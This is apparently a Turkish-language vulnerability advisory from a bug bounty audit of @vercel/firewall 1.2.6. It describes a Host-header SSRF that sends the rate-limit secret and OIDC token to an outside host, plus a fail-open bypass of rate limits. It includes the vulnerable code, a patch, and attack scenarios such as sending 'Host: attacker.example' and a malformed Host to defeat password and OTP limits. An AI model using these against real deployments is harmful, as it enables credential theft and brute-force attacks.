# Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Doğrulanmamış `Host` Başlığı / `region` SSRF İle `VF_RATE_LIMIT_SECRET` Sızıntısı ve Fail-Open Hız Sınırı Atlama (`VERCEL-FIREWALL-01`)

[English](../44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | **Türkçe** | [日本語](../ja/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | [简体中文](../zh-CN/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | [한국어](../ko/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)

## 1. Açığın Özeti ve Kodda Nasıl Zafiyete Dönüştüğü (`Herkesin Anlayabileceği Adım Adım Teknik Mekanizma`)

### Adım Adım Teknik Mekanizma
1. **Adım 1 — Doğrulanmamış `Host` Başlığının Giden HTTPS URL'sine Enjekte Edilmesi (`packages/firewall/src/rate-limit.ts:138-167, 224`):** `VERCEL_ENV !== 'production'` olduğunda (staging, preview veya kendi sunucusunda çalışan kurulumlar), `resolveFirewallHost()` gelen isteğin `Host` başlığını alır ve doğrulama yapmadan `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check` adresine `POST` isteği gönderir.
2. **Adım 2 — `VF_RATE_LIMIT_SECRET` ve `x-vercel-oidc-token` Sırlarının Dış Sunucuya Sızdırılması (`rate-limit.ts:169-183`):** `buildAuthHeaders()` fonksiyonu bu giden isteğe `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` başlıklarını ekler.
3. **Adım 3 — Evrensel Fail-Open (`rateLimited: false`) Hız Sınırı Atlaması ve Go `ipc-proxy` Ham `%s` Hatası (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Saldırgan `VERCEL_ENV=production` ortamında bile `Host: victim.com/@invalid` gönderdiğinde giden istek hata alır ve `callRemoteRateLimitAPI()` **fail-open** yaparak `{ rateLimited: false }` döndürür; böylece parola/OTP deneme sınırı tamamen aşılır.

### Zafiyetli Kod Kesiti
```typescript
// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
function resolveFirewallHost(options: RateLimitOptions): string | null {
  if (process.env.VERCEL_ENV !== 'production') {
    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
  }
  return process.env.VERCEL_URL || null;
}
// In callRemoteRateLimitAPI():
const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
```

---

## 2. Günlük Hayatta Yol Açabileceği Kritik Senaryolar (`Senaryo A` / `Senaryo B` / `Senaryo C`)

### Senaryo A — Staging / Preview / Self-Hosted Ortamlarda `VF_RATE_LIMIT_SECRET` ve OIDC Token Çalınması
`await checkRateLimit('login-limit', { request })` kullanan bir uygulamaya `Host: attacker.example` gönderildiğinde `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` doğrudan saldırgana gönderilir.

### Senaryo B — `rateLimited: false` Fail-Open İle Parola ve OTP Hız Sınırının Atlanması
Hatalı `Host` başlığı giden isteğin `404`/`400` almasına yol açar ve SDK `{ rateLimited: false }` döndürerek sınırsız denemeye izin verir.

### Senaryo C — Go `ipc-proxy` Ham `%s` Hatası
`cmd/ipc-proxy/client.go:38` `fmt.Sprintf` unutulduğu için `https://api-%s.vercel.com/v1/rate-limit` adresine bağlanmaya çalışır.

---

## 3. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları

```bash
# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'

# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
```

---

## 4. Uçtan Uca Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`) ve Savunma Yaması

Vercel & Next.js Canlı npm Paketi Doğrulama Süiti ile üretilen çalışma zamanı kanıtı (bkz. [`vercel-real-world-impact-e2e-20261029.json`](../vercel-real-world-impact-e2e-20261029.json)):

```json
{
  "VERCEL-FIREWALL-01": {
    "RED": {
      "package_tested": "@vercel/firewall@1.2.6",
      "attacker_received_request": true,
      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
      "fail_open_result_on_error": {
        "rateLimited": false,
        "error": "not_found"
      }
    },
    "GREEN": {
      "untrusted_host_and_region_rejected": true,
      "attacker_received_request": false,
      "go_ipc_proxy_sprintf_formatted": true
    }
  }
}
```

### Birleştirilmiş Savunma Yaması (`git apply --check` temiz)
```diff
--- a/packages/firewall/src/rate-limit.ts
+++ b/packages/firewall/src/rate-limit.ts
@@ -115,6 +115,9 @@ function getApiHost(region?: string): string {
   const resolved = region || process.env.VERCEL_REGION;
+  if (resolved && !/^[a-z0-9-]+$/i.test(resolved)) {
+    throw new Error('Invalid region identifier');
+  }
   return resolved ? `api-${resolved}.vercel.com` : 'api.vercel.com';
 }
```
